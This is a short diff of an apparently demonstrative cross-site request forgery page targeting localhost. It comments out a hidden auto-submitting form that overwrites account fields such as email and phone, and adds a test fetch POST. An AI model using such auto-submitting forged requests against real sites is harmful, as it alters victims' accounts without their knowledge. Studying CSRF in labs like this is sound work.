@@ -2,15 +2,24 @@
 
 <!-- HACKER CONTROL FORM FROM EVIL DOMAIN  -->
 
-<form id="autosubmit" action="http://localhost:8080/" method="POST">
+<!-- <form id="autosubmit" action="http://localhost:8080/" method="POST">
  <input name="id" type="hidden" value="1" />
  <input name="username" type="hidden" value="" />
  <input name="password" type="hidden" value="" />
  <input name="fullname" type="hidden" value="hack fullname" />
  <input name="email" type="hidden" value="notadminemail@google.com" />
  <input name="phone" type="hidden" value="090909090909" />
-</form>
+</form> -->
  
 <script>
- document.getElementById("autosubmit").submit();
+//  document.getElementById("autosubmit").submit();
+  const url = "http://localhost:8080/"
+  const data = {"hello": "world"}
+  fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": 'application/json'
+    },
+    body: JSON.stringify(data)
+  })
 </script>
